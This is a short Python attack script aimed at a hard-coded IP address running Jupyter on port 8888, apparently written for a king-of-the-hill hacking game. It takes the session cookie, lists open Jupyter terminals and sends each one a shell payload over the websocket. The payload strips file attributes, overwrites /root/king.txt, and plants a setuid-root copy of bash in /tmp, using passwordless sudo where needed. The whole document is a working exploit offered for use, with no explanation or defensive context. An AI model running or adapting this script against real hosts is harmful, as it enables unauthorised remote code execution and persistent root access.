#!/usr/bin/env python3
import json
import time
import requests
import websocket

target = "159.223.68.133"
base = f"http://{target}:8888"
session = requests.Session()
session.get(base + "/tree", timeout=8)
cookie = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
terminals = session.get(base + "/api/terminals", timeout=8).json()

payload = "chattr -i -a /root/king.txt 2>/dev/null; printf 'Milix\\n' > /root/king.txt; cp /bin/bash /tmp/milix-root; chown root:root /tmp/milix-root; chmod 4755 /tmp/milix-root; echo MILIX_ROOT_OK"
command = f"if [ \"$(id -u)\" = 0 ]; then {payload}; else sudo -n sh -c \"{payload}\" 2>&1; fi\n"

for terminal in terminals:
    name = terminal["name"]
    try:
        ws = websocket.create_connection(
            f"ws://{target}:8888/terminals/websocket/{name}",
            cookie=cookie,
            origin=base,
            timeout=2,
        )
        ws.settimeout(0.15)
        try:
            while True:
                ws.recv()
        except Exception:
            pass
        ws.settimeout(2)
        ws.send(json.dumps(["stdin", command]))
        end = time.time() + 2
        output = ""
        while time.time() < end:
            try:
                message = json.loads(ws.recv())
                if len(message) > 1 and message[0] == "stdout":
                    output += message[1]
            except Exception:
                break
        print(f"=== terminal {name} ===\n{output}")
        ws.close()
    except Exception as exc:
        print(f"=== terminal {name} error === {exc}")
